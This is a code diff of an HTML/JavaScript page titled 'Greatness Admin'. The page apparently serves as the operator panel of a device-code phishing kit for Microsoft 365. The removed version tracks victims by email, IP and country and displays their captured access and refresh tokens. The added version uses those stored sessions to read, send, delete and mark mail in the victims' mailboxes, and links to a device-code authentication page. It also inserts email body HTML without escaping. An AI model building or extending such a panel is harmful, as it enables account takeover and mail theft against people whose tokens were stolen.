@@ -3,350 +3,781 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Greatness Admin Dashboard - Live Sessions</title>
-    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <title>Greatness Admin - Full Mailbox Management</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: #0a0e27; color: #e0e0e0; padding: 20px; }
-        .container { max-width: 1400px; margin: 0 auto; }
-        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px; padding-bottom: 20px; border-bottom: 1px solid #1e2342; }
-        .logo h1 { font-size: 24px; font-weight: 600; background: linear-gradient(135deg, #6c63ff, #3b82f6); -webkit-background-clip: text; background-clip: text; color: transparent; }
-        .logo p { font-size: 12px; color: #6b7280; }
-        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-bottom: 30px; }
-        .stat-card { background: #111635; border-radius: 16px; padding: 20px; border: 1px solid #1e2342; transition: transform 0.2s; }
-        .stat-card:hover { transform: translateY(-2px); border-color: #3b82f6; }
-        .stat-title { font-size: 13px; color: #8b8fbf; margin-bottom: 8px; }
-        .stat-value { font-size: 32px; font-weight: 700; color: white; }
-        .main-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-bottom: 30px; }
-        .card { background: #111635; border-radius: 16px; padding: 20px; border: 1px solid #1e2342; }
-        .card h3 { margin-bottom: 15px; font-size: 18px; font-weight: 500; }
-        canvas { max-height: 250px; }
-        .tools-section { background: #111635; border-radius: 16px; padding: 20px; margin-bottom: 30px; border: 1px solid #1e2342; }
-        .tools-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
-        .tools-header h3 { font-size: 18px; font-weight: 500; margin: 0; }
-        .tools-grid { display: flex; gap: 15px; flex-wrap: wrap; }
-        .tool-btn { background: linear-gradient(135deg, #1a1f3e, #111635); border: 1px solid #2a2f4e; padding: 12px 24px; border-radius: 10px; color: #e0e0e0; cursor: pointer; font-size: 14px; font-weight: 500; transition: all 0.2s ease; display: inline-flex; align-items: center; gap: 8px; }
-        .tool-btn:hover { background: linear-gradient(135deg, #2a2f5e, #1a1f4e); border-color: #3b82f6; transform: translateY(-1px); box-shadow: 0 4px 12px rgba(59, 130, 246, 0.2); }
-        .table-container { background: #111635; border-radius: 16px; padding: 20px; border: 1px solid #1e2342; overflow-x: auto; }
-        .table-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; }
-        table { width: 100%; border-collapse: collapse; }
-        th, td { text-align: left; padding: 12px 8px; border-bottom: 1px solid #1e2342; }
-        th { color: #8b8fbf; font-weight: 500; font-size: 12px; }
-        td { font-size: 13px; }
-        .open-email-btn, .view-token-btn { background: #3b82f6; border: none; padding: 6px 12px; border-radius: 6px; color: white; cursor: pointer; font-size: 11px; font-weight: 500; transition: all 0.2s; margin: 2px; }
-        .view-token-btn { background: #10b981; }
-        .view-token-btn:hover { background: #059669; }
-        .open-email-btn:hover { background: #2563eb; }
-        .badge { background: #1e3a5f; padding: 4px 12px; border-radius: 20px; font-size: 11px; color: #60a5fa; }
-        .token-modal { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #111635; border-radius: 16px; padding: 24px; width: 600px; max-width: 90%; z-index: 1000; border: 1px solid #3b82f6; box-shadow: 0 20px 40px rgba(0,0,0,0.5); }
-        .token-modal pre { background: #0a0e27; padding: 15px; border-radius: 8px; overflow-x: auto; font-size: 11px; margin: 15px 0; }
-        .overlay { display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.7); z-index: 999; }
-        .close-modal { background: #ef4444; margin-top: 10px; }
-        .custom-legend { display: flex; flex-wrap: wrap; gap: 15px; margin-top: 15px; justify-content: center; }
-        .legend-item { display: flex; align-items: center; gap: 8px; font-size: 12px; }
-        .legend-color { width: 20px; height: 20px; border-radius: 4px; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #1e1e2e;
+            color: #e0e0e0;
+            overflow: hidden;
+        }
+
+        /* Main Layout */
+        .app-container {
+            display: flex;
+            height: 100vh;
+        }
+
+        /* Sidebar - Sessions List */
+        .sidebar {
+            width: 300px;
+            background: #111827;
+            border-right: 1px solid #2d3748;
+            display: flex;
+            flex-direction: column;
+            overflow-y: auto;
+        }
+
+        .sidebar-header {
+            padding: 20px;
+            border-bottom: 1px solid #2d3748;
+            background: #0f172a;
+        }
+
+        .sidebar-header h1 {
+            font-size: 20px;
+            background: linear-gradient(135deg, #667eea, #3b82f6);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+
+        .sidebar-header p {
+            font-size: 11px;
+            color: #6b7280;
+            margin-top: 4px;
+        }
+
+        .sessions-list {
+            flex: 1;
+            padding: 16px;
+        }
+
+        .session-card {
+            background: #1a1f3e;
+            border: 1px solid #2d3748;
+            border-radius: 12px;
+            padding: 16px;
+            margin-bottom: 12px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .session-card:hover {
+            background: #1f2937;
+            border-color: #3b82f6;
+            transform: translateX(4px);
+        }
+
+        .session-card.active {
+            border-color: #3b82f6;
+            background: #1e293b;
+            box-shadow: 0 0 10px rgba(59,130,246,0.3);
+        }
+
+        .session-email {
+            font-size: 13px;
+            font-weight: 600;
+            word-break: break-all;
+            color: white;
+        }
+
+        .session-ip {
+            font-size: 10px;
+            color: #6b7280;
+            margin-top: 4px;
+        }
+
+        .session-time {
+            font-size: 9px;
+            color: #4b5563;
+            margin-top: 6px;
+        }
+
+        .btn-add {
+            background: linear-gradient(135deg, #667eea, #3b82f6);
+            border: none;
+            padding: 12px;
+            border-radius: 10px;
+            color: white;
+            cursor: pointer;
+            width: calc(100% - 32px);
+            margin: 0 16px 16px;
+            font-weight: 600;
+        }
+
+        .btn-add:hover {
+            transform: translateY(-1px);
+        }
+
+        /* Main Content Area */
+        .main-content {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+        }
+
+        /* Top Bar */
+        .top-bar {
+            background: #111827;
+            padding: 12px 20px;
+            border-bottom: 1px solid #2d3748;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .current-session-info {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .current-email {
+            font-size: 14px;
+            font-weight: 600;
+            color: #60a5fa;
+        }
+
+        .btn-icon {
+            background: #1f2937;
+            border: 1px solid #374151;
+            padding: 6px 12px;
+            border-radius: 6px;
+            color: white;
+            cursor: pointer;
+            font-size: 12px;
+            transition: all 0.2s;
+        }
+
+        .btn-icon:hover {
+            background: #374151;
+        }
+
+        /* Folders Bar */
+        .folders-bar {
+            background: #0f172a;
+            padding: 8px 20px;
+            border-bottom: 1px solid #2d3748;
+            display: flex;
+            gap: 8px;
+            overflow-x: auto;
+        }
+
+        .folder-btn {
+            background: transparent;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 20px;
+            color: #9ca3af;
+            cursor: pointer;
+            font-size: 13px;
+            transition: all 0.2s;
+            white-space: nowrap;
+        }
+
+        .folder-btn:hover {
+            background: #1f2937;
+            color: white;
+        }
+
+        .folder-btn.active {
+            background: #3b82f6;
+            color: white;
+        }
+
+        /* Email List */
+        .email-list {
+            flex: 1;
+            overflow-y: auto;
+            padding: 16px;
+        }
+
+        .email-item {
+            background: #111827;
+            border: 1px solid #2d3748;
+            border-radius: 10px;
+            padding: 14px;
+            margin-bottom: 8px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .email-item:hover {
+            background: #1a1f3e;
+            border-color: #3b82f6;
+        }
+
+        .email-item.unread {
+            background: #1e293b;
+            border-left: 3px solid #3b82f6;
+        }
+
+        .email-subject {
+            font-weight: 600;
+            margin-bottom: 4px;
+            font-size: 14px;
+        }
+
+        .email-from {
+            font-size: 12px;
+            color: #9ca3af;
+            margin-bottom: 4px;
+        }
+
+        .email-preview {
+            font-size: 11px;
+            color: #6b7280;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .email-meta {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 8px;
+            font-size: 10px;
+            color: #4b5563;
+        }
+
+        .attachment-icon {
+            color: #f59e0b;
+            margin-left: 8px;
+        }
+
+        /* Email View Panel */
+        .email-panel {
+            position: fixed;
+            right: -600px;
+            top: 0;
+            width: 600px;
+            height: 100vh;
+            background: #111827;
+            border-left: 1px solid #2d3748;
+            z-index: 1000;
+            transition: right 0.3s ease;
+            display: flex;
+            flex-direction: column;
+            overflow-y: auto;
+        }
+
+        .email-panel.open {
+            right: 0;
+        }
+
+        .panel-header {
+            padding: 20px;
+            border-bottom: 1px solid #2d3748;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: sticky;
+            top: 0;
+            background: #111827;
+        }
+
+        .panel-body {
+            padding: 20px;
+            flex: 1;
+        }
+
+        .email-full-subject {
+            font-size: 18px;
+            margin-bottom: 15px;
+        }
+
+        .email-details {
+            background: #0f172a;
+            padding: 12px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            font-size: 12px;
+        }
+
+        .email-content {
+            line-height: 1.6;
+            font-size: 14px;
+        }
+
+        .action-buttons {
+            display: flex;
+            gap: 8px;
+            margin-top: 20px;
+            flex-wrap: wrap;
+        }
+
+        /* Compose Modal */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0,0,0,0.8);
+            z-index: 2000;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .modal.open {
+            display: flex;
+        }
+
+        .modal-content {
+            background: #111827;
+            border-radius: 16px;
+            width: 550px;
+            max-width: 90%;
+            max-height: 85vh;
+            overflow-y: auto;
+            border: 1px solid #374151;
+        }
+
+        .modal-header {
+            padding: 20px;
+            border-bottom: 1px solid #2d3748;
+            display: flex;
+            justify-content: space-between;
+        }
+
+        .modal-body {
+            padding: 20px;
+        }
+
+        .modal-body input, .modal-body textarea {
+            width: 100%;
+            background: #1f2937;
+            border: 1px solid #374151;
+            padding: 10px;
+            border-radius: 8px;
+            color: white;
+            margin-bottom: 12px;
+            font-family: inherit;
+        }
+
+        .modal-body textarea {
+            resize: vertical;
+            min-height: 150px;
+        }
+
+        .loading {
+            text-align: center;
+            padding: 40px;
+            color: #6b7280;
+        }
+
+        .spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 2px solid #374151;
+            border-top-color: #3b82f6;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .empty-state {
+            text-align: center;
+            padding: 60px;
+            color: #6b7280;
+        }
+
+        ::-webkit-scrollbar {
+            width: 8px;
+            height: 8px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: #1f2937;
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: #374151;
+            border-radius: 4px;
+        }
     </style>
 </head>
 <body>
-<div class="container">
-    <div class="header">
-        <div class="logo">
+<div class="app-container">
+    <!-- Sidebar with Sessions -->
+    <div class="sidebar">
+        <div class="sidebar-header">
             <h1>Greatness Admin</h1>
-            <p>Live Microsoft Session Manager</p>
+            <p>Microsoft 365 Mailbox Manager</p>
         </div>
-        <div class="badge" id="sessionCount">0 Active Sessions</div>
+        
+        <div class="sessions-list" id="sessionsList">
+            <div class="loading">Loading sessions...</div>
+        </div>
+        
+        <button class="btn-add" onclick="openAuthPage()">➕ Add Microsoft Account</button>
+        <button class="btn-add" style="background: #dc2626; margin-bottom: 20px;" onclick="clearAllSessions()">🗑️ Clear All Sessions</button>
     </div>
-
-    <div class="stats-grid">
-        <div class="stat-card">
-            <div class="stat-title">Total Visits</div>
-            <div class="stat-value" id="totalVisits">0</div>
+    
+    <!-- Main Content -->
+    <div class="main-content">
+        <div class="top-bar">
+            <div class="current-session-info">
+                <span>📧</span>
+                <span class="current-email" id="currentEmailDisplay">No session selected</span>
+            </div>
+            <div>
+                <button class="btn-icon" onclick="refreshCurrentFolder()">🔄 Refresh</button>
+            </div>
         </div>
-        <div class="stat-card">
-            <div class="stat-title">Active Sessions</div>
-            <div class="stat-value" id="activeSessions">0</div>
+        
+        <!-- Folders -->
+        <div class="folders-bar" id="foldersBar">
+            <button class="folder-btn active" onclick="loadFolder('inbox')">📥 Inbox</button>
+            <button class="folder-btn" onclick="loadFolder('sent')">📤 Sent</button>
+            <button class="folder-btn" onclick="loadFolder('drafts')">📝 Drafts</button>
+            <button class="folder-btn" onclick="loadFolder('deleted')">🗑️ Deleted</button>
+            <button class="folder-btn" onclick="loadFolder('archive')">📦 Archive</button>
+            <button class="folder-btn" onclick="loadFolder('junk')">⚠️ Junk</button>
         </div>
-        <div class="stat-card">
-            <div class="stat-title">Total Users</div>
-            <div class="stat-value" id="totalUsers">0</div>
+        
+        <!-- Email List -->
+        <div class="email-list" id="emailList">
+            <div class="empty-state">Select a session to view emails</div>
         </div>
-        <div class="stat-card">
-            <div class="stat-title">Countries</div>
-            <div class="stat-value" id="totalCountries">0</div>
-        </div>
-    </div>
-
-    <div class="main-grid">
-        <div class="card">
-            <h3>Visits (Last 12 Months)</h3>
-            <canvas id="visitsChart"></canvas>
-        </div>
-        <div class="card">
-            <h3>Active Sessions by Region</h3>
-            <canvas id="sessionsChart"></canvas>
-            <div class="custom-legend" id="customLegend"></div>
-        </div>
-    </div>
-
-    <div class="tools-section">
-        <div class="tools-header">
-            <h3>🔧 Admin Tools</h3>
-        </div>
-        <div class="tools-grid">
-            <button class="tool-btn" id="refreshSessionsBtn">🔄 Refresh Sessions</button>
-            <button class="tool-btn" id="clearAllSessionsBtn">🗑️ Clear All Sessions</button>
-            <button class="tool-btn" id="exportDataBtn">📄 Export Data</button>
-        </div>
-    </div>
-
-    <div class="table-container">
-        <div class="table-header">
-            <h3>📋 User Sessions</h3>
-            <button class="tool-btn" id="refreshTableBtn" style="padding: 8px 16px;">🔄 Refresh</button>
-        </div>
-        <table>
-            <thead>
-                <tr>
-                    <th>Email</th>
-                    <th>IP Address</th>
-                    <th>User Agent</th>
-                    <th>Country</th>
-                    <th>Last Active</th>
-                    <th>View Token</th>
-                    <th>Action</th>
-                </tr>
-            </thead>
-            <tbody id="sessionsTableBody">
-                <tr><td colspan="7" style="text-align: center;">No sessions yet. Authenticate using device code page.</td></tr>
-            </tbody>
-        </table>
     </div>
 </div>
 
-<div class="overlay" id="overlay"></div>
-<div class="token-modal" id="tokenModal">
-    <h3>🔐 Session Token Details</h3>
-    <div id="tokenDetails"></div>
-    <button class="tool-btn close-modal" onclick="closeTokenModal()">Close</button>
+<!-- Email View Panel -->
+<div id="emailPanel" class="email-panel">
+    <div class="panel-header">
+        <h3 id="panelSubject">Loading...</h3>
+        <button class="btn-icon" onclick="closeEmailPanel()">✕ Close</button>
+    </div>
+    <div class="panel-body" id="panelBody">
+        <div class="loading"><div class="spinner"></div> Loading...</div>
+    </div>
+</div>
+
+<!-- Compose Modal -->
+<div id="composeModal" class="modal">
+    <div class="modal-content">
+        <div class="modal-header">
+            <h3>✏️ New Email</h3>
+            <button class="btn-icon" onclick="closeComposeModal()">✕</button>
+        </div>
+        <div class="modal-body">
+            <input type="text" id="composeTo" placeholder="To: email@example.com">
+            <input type="text" id="composeCc" placeholder="Cc: (optional)">
+            <input type="text" id="composeSubject" placeholder="Subject">
+            <textarea id="composeBody" placeholder="Write your message here..."></textarea>
+            <div style="display: flex; gap: 10px; margin-top: 10px;">
+                <button class="btn-icon" style="background: #3b82f6;" onclick="sendEmail()">Send</button>
+                <button class="btn-icon" onclick="closeComposeModal()">Cancel</button>
+            </div>
+        </div>
+    </div>
 </div>
 
 <script>
-    let visitsChart, sessionsChart;
-    let countryData = {};
-
-    async function apiCall(endpoint, options = {}) {
-        try {
-            const response = await fetch(endpoint, {
-                ...options,
-                headers: { 'Content-Type': 'application/json', ...options.headers }
-            });
-            if (!response.ok) throw new Error(`API error: ${response.status}`);
-            return await response.json();
-        } catch (err) {
-            console.error('API call failed:', err);
-            return null;
-        }
-    }
-
+    const API_BASE_URL = '';
+    let currentSessionId = null;
+    let currentFolder = 'inbox';
+    let currentEmails = [];
+    let sessions = [];
+    let currentMessageId = null;
+    
+    // Load all sessions
     async function loadSessions() {
-        const data = await apiCall('/api/sessions');
-        if (data && data.sessions) {
-            renderTable(data.sessions);
-            updateStats(data.sessions);
-            updateCharts(data.sessions);
-            document.getElementById('sessionCount').innerHTML = `${data.sessions.length} Active Sessions`;
+        try {
+            const response = await fetch('/api/sessions');
+            const data = await response.json();
+            sessions = data.sessions || [];
+            renderSessionsList();
+            
+            if (sessions.length === 0) {
+                document.getElementById('emailList').innerHTML = '<div class="empty-state">📭 No accounts connected. Click "Add Microsoft Account" to start.</div>';
+            }
+        } catch (err) {
+            console.error('Failed to load sessions:', err);
         }
     }
-
-    function renderTable(sessions) {
-        const tbody = document.getElementById('sessionsTableBody');
-        if (!sessions || sessions.length === 0) {
-            tbody.innerHTML = '<tr><td colspan="7" style="text-align: center;">No sessions found. Please authenticate using the device code page.</td></tr>';
+    
+    // Render sessions list
+    function renderSessionsList() {
+        const container = document.getElementById('sessionsList');
+        if (sessions.length === 0) {
+            container.innerHTML = '<div class="empty-state" style="padding: 20px;">No accounts yet<br><small>Click below to add</small></div>';
             return;
         }
         
-        tbody.innerHTML = sessions.map(session => `
-            <tr>
-                <td>${escapeHtml(session.email)}</td>
-                <td><code>${escapeHtml(session.ip || 'Unknown')}</code></td>
-                <td style="max-width: 200px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;" title="${escapeHtml(session.userAgent || 'Unknown')}">
-                    ${escapeHtml((session.userAgent || 'Unknown').substring(0, 50))}...
-                </td>
-                <td>${escapeHtml(session.country || 'Unknown')}</td>
-                <td>${escapeHtml(session.lastActive || new Date().toLocaleString())}</td>
-                <td><button class="view-token-btn" onclick="viewToken('${session.sessionId}')">🔑 View Token</button></td>
-                <td><button class="open-email-btn" onclick="openOutlook('${session.email}')">✉️ Open Email</button></td>
-            </tr>
-        `).join('');
-    }
-
-    function updateStats(sessions) {
-        document.getElementById('totalVisits').innerText = sessions.length;
-        document.getElementById('activeSessions').innerText = sessions.length;
-        document.getElementById('totalUsers').innerText = sessions.length;
-        
-        // Count unique countries
-        const uniqueCountries = new Set(sessions.map(s => s.country).filter(c => c && c !== 'Unknown'));
-        document.getElementById('totalCountries').innerText = uniqueCountries.size || 1;
-    }
-
-    function updateCharts(sessions) {
-        // Prepare visit history (by month)
-        const months = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];
-        const visitData = new Array(12).fill(0);
-        
-        sessions.forEach(session => {
-            if (session.createdAt) {
-                const month = new Date(session.createdAt).getMonth();
-                visitData[month]++;
-            }
-        });
-        
-        // Update visits chart
-        if (visitsChart) visitsChart.destroy();
-        const ctx1 = document.getElementById('visitsChart').getContext('2d');
-        visitsChart = new Chart(ctx1, {
-            type: 'line',
-            data: {
-                labels: months,
-                datasets: [{
-                    label: 'Authentications',
-                    data: visitData,
-                    borderColor: '#3b82f6',
-                    backgroundColor: 'rgba(59,130,246,0.1)',
-                    tension: 0.3,
-                    fill: true,
-                    pointBackgroundColor: '#3b82f6'
-                }]
-            },
-            options: {
-                responsive: true,
-                plugins: { legend: { labels: { color: '#c4c7f0' } } },
-                scales: { y: { grid: { color: '#1e2342' }, ticks: { color: '#c4c7f0' } }, x: { ticks: { color: '#c4c7f0' } } }
-            }
-        });
-        
-        // Prepare region data
-        const regionColors = {
-            'United States': '#B22234',
-            'Canada': '#FF0000',
-            'Germany': '#FFCC00',
-            'United Kingdom': '#00247D',
-            'France': '#0055A4',
-            'Japan': '#BC002D',
-            'Australia': '#012169',
-            'Other': '#6B8E23'
-        };
-        
-        const regionCount = {};
-        sessions.forEach(session => {
-            const country = session.country || 'Other';
-            regionCount[country] = (regionCount[country] || 0) + 1;
-        });
-        
-        const regionLabels = Object.keys(regionCount);
-        const regionValues = Object.values(regionCount);
-        const regionColorsUsed = regionLabels.map(label => regionColors[label] || '#6B8E23');
-        
-        // Update sessions chart
-        if (sessionsChart) sessionsChart.destroy();
-        const ctx2 = document.getElementById('sessionsChart').getContext('2d');
-        sessionsChart = new Chart(ctx2, {
-            type: 'doughnut',
-            data: {
-                labels: regionLabels,
-                datasets: [{
-                    data: regionValues,
-                    backgroundColor: regionColorsUsed,
-                    borderColor: '#111635',
-                    borderWidth: 3,
-                    hoverOffset: 8
-                }]
-            },
-            options: {
-                responsive: true,
-                plugins: { legend: { display: false }, tooltip: { callbacks: { label: (ctx) => `${ctx.label}: ${ctx.raw} sessions` } } }
-            }
-        });
-        
-        // Build custom legend
-        const legendContainer = document.getElementById('customLegend');
-        legendContainer.innerHTML = regionLabels.map((label, index) => `
-            <div class="legend-item">
-                <div class="legend-color" style="background: ${regionColorsUsed[index]};"></div>
-                <span>${label}</span>
-                <span style="color: #8b8fbf;">(${regionValues[index]} sessions)</span>
+        container.innerHTML = sessions.map(session => `
+            <div class="session-card ${currentSessionId === session.sessionId ? 'active' : ''}" onclick="selectSession('${session.sessionId}')">
+                <div class="session-email">📧 ${escapeHtml(session.email)}</div>
+                <div class="session-ip">🌐 IP: ${escapeHtml(session.ip || 'Unknown')}</div>
+                <div class="session-time">🕐 Last active: ${formatDate(session.lastActive)}</div>
+                <div style="margin-top: 8px;">
+                    <button class="btn-icon" style="font-size: 10px; padding: 4px 8px;" onclick="event.stopPropagation(); openMailbox('${session.sessionId}')">📧 Open Mailbox</button>
+                </div>
             </div>
         `).join('');
     }
-
-    async function viewToken(sessionId) {
-        const data = await apiCall(`/api/session/token/${sessionId}`);
-        if (data && data.token) {
-            const tokenHtml = `
-                <p><strong>Email:</strong> ${escapeHtml(data.email)}</p>
-                <p><strong>Expires:</strong> ${new Date(data.expiresAt).toLocaleString()}</p>
-                <p><strong>Access Token:</strong></p>
-                <pre>${escapeHtml(data.token.access_token)}</pre>
-                ${data.token.refresh_token ? `<p><strong>Refresh Token:</strong></p><pre>${escapeHtml(data.token.refresh_token)}</pre>` : ''}
+    
+    // Select session and load mailbox
+    async function selectSession(sessionId) {
+        currentSessionId = sessionId;
+        const session = sessions.find(s => s.sessionId === sessionId);
+        if (session) {
+            document.getElementById('currentEmailDisplay').innerHTML = session.email;
+            renderSessionsList();
+            await loadFolder('inbox');
+        }
+    }
+    
+    // Open mailbox directly (called from Open Email button)
+    async function openMailbox(sessionId) {
+        await selectSession(sessionId);
+    }
+    
+    // Load folder emails
+    async function loadFolder(folder) {
+        if (!currentSessionId) {
+            document.getElementById('emailList').innerHTML = '<div class="empty-state">Select a session first</div>';
+            return;
+        }
+        
+        currentFolder = folder;
+        
+        // Update active folder button
+        document.querySelectorAll('.folder-btn').forEach(btn => {
+            btn.classList.remove('active');
+            if (btn.textContent.toLowerCase().includes(folder)) {
+                btn.classList.add('active');
+            }
+        });
+        
+        document.getElementById('emailList').innerHTML = '<div class="loading"><div class="spinner"></div> Loading emails...</div>';
+        
+        try {
+            const response = await fetch(`/api/mail/${currentSessionId}/${folder}?top=50`);
+            const data = await response.json();
+            currentEmails = data.value || [];
+            renderEmailList(currentEmails);
+        } catch (err) {
+            console.error('Failed to load emails:', err);
+            document.getElementById('emailList').innerHTML = '<div class="empty-state">Failed to load emails. Token may have expired.</div>';
+        }
+    }
+    
+    // Render email list
+    function renderEmailList(emails) {
+        if (!emails || emails.length === 0) {
+            document.getElementById('emailList').innerHTML = '<div class="empty-state">📭 No emails in this folder</div>';
+            return;
+        }
+        
+        document.getElementById('emailList').innerHTML = emails.map(email => `
+            <div class="email-item ${!email.isRead ? 'unread' : ''}" onclick="openEmail('${email.id}')">
+                <div class="email-subject">
+                    ${escapeHtml(email.subject || '(No subject)')}
+                    ${email.hasAttachments ? '<span class="attachment-icon">📎</span>' : ''}
+                </div>
+                <div class="email-from">${escapeHtml(email.from?.emailAddress?.name || email.from?.emailAddress?.address || 'Unknown')}</div>
+                <div class="email-preview">${escapeHtml(email.bodyPreview || 'No preview')}</div>
+                <div class="email-meta">
+                    <span>📅 ${formatDate(email.receivedDateTime)}</span>
+                    ${!email.isRead ? '<span>🔵 Unread</span>' : ''}
+                </div>
+            </div>
+        `).join('');
+    }
+    
+    // Open full email
+    async function openEmail(messageId) {
+        currentMessageId = messageId;
+        document.getElementById('emailPanel').classList.add('open');
+        document.getElementById('panelSubject').innerHTML = 'Loading...';
+        document.getElementById('panelBody').innerHTML = '<div class="loading"><div class="spinner"></div> Loading message...</div>';
+        
+        try {
+            const response = await fetch(`/api/mail/message/${currentSessionId}/${messageId}`);
+            const email = await response.json();
+            
+            document.getElementById('panelSubject').innerHTML = escapeHtml(email.subject || '(No subject)');
+            document.getElementById('panelBody').innerHTML = `
+                <div class="email-details">
+                    <div><strong>From:</strong> ${escapeHtml(email.from?.emailAddress?.name || email.from?.emailAddress?.address)}</div>
+                    <div><strong>To:</strong> ${escapeHtml(email.toRecipients?.map(r => r.emailAddress.address).join(', ') || 'Unknown')}</div>
+                    <div><strong>Date:</strong> ${new Date(email.receivedDateTime).toLocaleString()}</div>
+                </div>
+                <div class="email-content">
+                    ${email.body?.content || email.bodyPreview || 'No content'}
+                </div>
+                <div class="action-buttons">
+                    <button class="btn-icon" onclick="replyToEmail()">↩️ Reply</button>
+                    <button class="btn-icon" onclick="deleteEmail()">🗑️ Delete</button>
+                    <button class="btn-icon" onclick="markAsRead()">✓ Mark as Read</button>
+                    <button class="btn-icon" onclick="closeEmailPanel()">Close</button>
+                </div>
             `;
-            document.getElementById('tokenDetails').innerHTML = tokenHtml;
-            document.getElementById('tokenModal').style.display = 'block';
-            document.getElementById('overlay').style.display = 'block';
-        } else {
-            alert('Failed to load token details');
+            
+            // Mark as read if not already
+            if (!email.isRead) {
+                await fetch(`/api/mail/message/${currentSessionId}/${messageId}`, {
+                    method: 'PATCH',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ isRead: true })
+                });
+                loadFolder(currentFolder);
+            }
+        } catch (err) {
+            document.getElementById('panelBody').innerHTML = '<div class="empty-state">Failed to load message</div>';
         }
     }
-
-    function closeTokenModal() {
-        document.getElementById('tokenModal').style.display = 'none';
-        document.getElementById('overlay').style.display = 'none';
+    
+    // Send email
+    async function sendEmail() {
+        const to = document.getElementById('composeTo').value.split(',').map(e => e.trim());
+        const cc = document.getElementById('composeCc').value.split(',').map(e => e.trim()).filter(e => e);
+        const subject = document.getElementById('composeSubject').value;
+        const body = document.getElementById('composeBody').value;
+        
+        if (!to.length || !subject) {
+            alert('Please fill in To and Subject');
+            return;
+        }
+        
+        try {
+            const response = await fetch(`/api/mail/send/${currentSessionId}`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ to, cc, subject, body })
+            });
+            
+            const result = await response.json();
+            if (result.success) {
+                alert('Email sent successfully!');
+                closeComposeModal();
+                loadFolder(currentFolder);
+            } else {
+                alert('Failed to send email');
+            }
+        } catch (err) {
+            alert('Error sending email');
+        }
     }
-
-    function openOutlook(email) {
-        // Opens Outlook Web Access directly
-        window.open(`https://outlook.office.com/mail/`, '_blank');
+    
+    // Delete current email
+    async function deleteEmail() {
+        if (!confirm('Delete this email?')) return;
+        
+        try {
+            await fetch(`/api/mail/message/${currentSessionId}/${currentMessageId}`, {
+                method: 'DELETE'
+            });
+            closeEmailPanel();
+            loadFolder(currentFolder);
+        } catch (err) {
+            alert('Failed to delete');
+        }
     }
-
+    
+    // Mark as read
+    async function markAsRead() {
+        try {
+            await fetch(`/api/mail/message/${currentSessionId}/${currentMessageId}`, {
+                method: 'PATCH',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ isRead: true })
+            });
+            loadFolder(currentFolder);
+        } catch (err) {
+            alert('Failed to mark as read');
+        }
+    }
+    
+    // Reply to email
+    function replyToEmail() {
+        const email = currentEmails.find(e => e.id === currentMessageId);
+        if (email) {
+            document.getElementById('composeTo').value = email.from?.emailAddress?.address || '';
+            document.getElementById('composeSubject').value = `Re: ${email.subject || ''}`;
+            document.getElementById('composeBody').value = `\n\n\n----- Original Message -----\nFrom: ${email.from?.emailAddress?.name}\nSent: ${formatDate(email.receivedDateTime)}\nSubject: ${email.subject}\n\n${email.bodyPreview}`;
+            openComposeModal();
+        }
+    }
+    
+    function refreshCurrentFolder() {
+        loadFolder(currentFolder);
+    }
+    
+    function openComposeModal() {
+        if (!currentSessionId) {
+            alert('Please select a session first');
+            return;
+        }
+        document.getElementById('composeModal').classList.add('open');
+    }
+    
+    function closeComposeModal() {
+        document.getElementById('composeModal').classList.remove('open');
+        document.getElementById('composeTo').value = '';
+        document.getElementById('composeCc').value = '';
+        document.getElementById('composeSubject').value = '';
+        document.getElementById('composeBody').value = '';
+    }
+    
+    function closeEmailPanel() {
+        document.getElementById('emailPanel').classList.remove('open');
+        currentMessageId = null;
+    }
+    
+    function openAuthPage() {
+        window.open('/device-auth.html', '_blank', 'width=600,height=700');
+        // Refresh sessions after 5 seconds
+        setTimeout(loadSessions, 5000);
+    }
+    
     async function clearAllSessions() {
-        if (confirm('⚠️ WARNING: This will delete all stored sessions and tokens. You will need to re-authenticate. Continue?')) {
-            await apiCall('/api/sessions/clear', { method: 'DELETE' });
+        if (confirm('⚠️ WARNING: This will delete ALL sessions and tokens. Continue?')) {
